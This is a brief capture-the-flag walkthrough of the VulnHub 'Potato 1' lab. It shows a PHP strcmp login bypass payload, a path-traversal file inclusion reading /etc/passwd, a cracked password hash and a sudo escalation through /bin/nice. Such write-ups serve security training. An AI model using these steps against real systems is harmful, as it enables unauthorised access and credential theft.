## Potato 1

https://www.infosecarticles.com/potato-1-vulnhub-walkthrough/

### www-data

Enumerating directories.
```
/admin                (Status: 301) [Size: 314] [--> http://192.168.1.146/admin/]
/index.php            (Status: 200) [Size: 245]
/potato               (Status: 301) [Size: 315] [--> http://192.168.1.146/potato/]
```

Inside /admin/
```
/index.php            (Status: 200) [Size: 466]
/logs                 (Status: 301) [Size: 319] [--> http://192.168.1.146/admin/logs/]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
```

Inside /logs/
```
# log_01.txt
Operation: password change
Date: January 03, 2020 / 11:25 a.m.
User: admin
Status: OK

# log_02.txt
Operation: reboot the server
Date: January 09, 2020 / 9:55 a.m.
User: admin
Status: OK 

# log_03.txt
Operation: password change
Date: August 2, 2020 / 9:25 p.m. 
User: admin
Status: OK
```

FTP port at 2121 has some files, including index.php that has this code:
```php
if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0)
```

We can bypass this authentication with the technique shown in this [article](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016) using array to strcmp return "Null" and as the operator uses only two equals, so it will return True when comparing "Null" with "0".
```
username=admin&password[]=root
```

LFI at log functionality.
```
POST /admin/dashboard.php?page=log
...
...
file=../../../../../etc/passwd
```

In /etc/passwd we get this:
```
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

Cracking it we find 'dragon'.
```
john webadminHash --wordlist=/usr/share/wordlists/rockyou.txt 
```

### Privilege Escalation
```
sudo -l
(ALL : ALL) /bin/nice /notes/*
```

We can use path traversal to execute our files.
```
sudo /bin/nice /notes/../home/webadmin/bash.sh
```
